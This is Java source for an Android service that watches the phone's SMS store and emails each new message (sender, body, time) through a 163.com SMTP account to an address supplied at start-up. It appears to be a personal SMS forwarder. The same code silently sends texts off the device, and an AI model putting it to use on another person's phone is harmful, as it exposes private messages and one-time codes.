package jiangwei.myapplication;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.Date;

import static java.lang.Thread.sleep;

public class MyService extends Service {
    private Uri SMS_INBOX = Uri.parse("content://sms/");
    private SmsObserver smsObserver;
    private String check="";  //用于检测重复
    private String check2="";  //用于检测重复
    private String to;  //接收邮箱地址

    /*
 * 得到短信数据库中的第一条短信
 * */
    public String getSmsInPhone()
    {
        final String SMS_URI_ALL   = "content://sms/";
        final String SMS_URI_INBOX = "content://sms/inbox";
        final String SMS_URI_SEND  = "content://sms/sent";
        final String SMS_URI_DRAFT = "content://sms/draft";

        final StringBuilder smsBuilder = new StringBuilder();

        try{
            ContentResolver cr = getContentResolver();
            String[] projection = new String[]{"_id", "address", "person",
                    "body", "date", "type"};
            Uri uri = Uri.parse(SMS_URI_ALL);
            Cursor cur = cr.query(uri, projection, null, null, "date desc");

            if (cur.moveToFirst())
            {
                String name;
                String phoneNumber;
                String smsbody;
                String date;
                String type;

                int nameColumn = cur.getColumnIndex("person");
                int phoneNumberColumn = cur.getColumnIndex("address");
                int smsbodyColumn = cur.getColumnIndex("body");
                int dateColumn = cur.getColumnIndex("date");
                int typeColumn = cur.getColumnIndex("type");
                name = cur.getString(nameColumn);
                phoneNumber = cur.getString(phoneNumberColumn);
                smsbody = cur.getString(smsbodyColumn);
                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
                Date d = new Date(Long.parseLong(cur.getString(dateColumn)));
                date = dateFormat.format(d);
                smsBuilder.append("短信来至："+phoneNumber+"        ");
                smsBuilder.append("短信内容："+smsbody+"         ");
                smsBuilder.append("接收时间："+date+"      ");
                if(smsbody == null)
                    smsbody = "";
            } else
            {
                smsBuilder.append("no result!");
            }

        } catch(SQLiteException ex) {

        }
        return smsBuilder.toString();
    }

    public MyService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        to=intent.getStringExtra("mailAd");
        smsObserver = new SmsObserver(this, smsHandler);
        getContentResolver().registerContentObserver(SMS_INBOX, true, smsObserver);

        return super.onStartCommand(intent, flags, startId);
    }

    public Handler smsHandler = new Handler() {

        //这里可以进行回调的操作
        //TODO

    };
    class SmsObserver extends ContentObserver {

        public SmsObserver(Context context, Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
           // super.onChange(selfChange);
            //每当有新短信到来时，使用我们获取短消息的方法

            try {
                sleep(5000);
                check=getSmsInPhone();
                if(!check.equals(check2))
                {
                    check2=check;
                    System.out.println(check);
                    new Thread(){   //发送短信出去
                        @Override
                        public void run() {
                            super.run();
                            MailUtils mail=new MailUtils("smtp.163.com", "jiangwei1995910@163.com", "*********");//163邮箱请使用授权码！不能直接使用密码登陆
                            mail.setAddress("jiangwei1995910@163.com", to);
                            mail.send("您的手机收到了一条新短信",check);
                        }
                    }.start();
                }
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
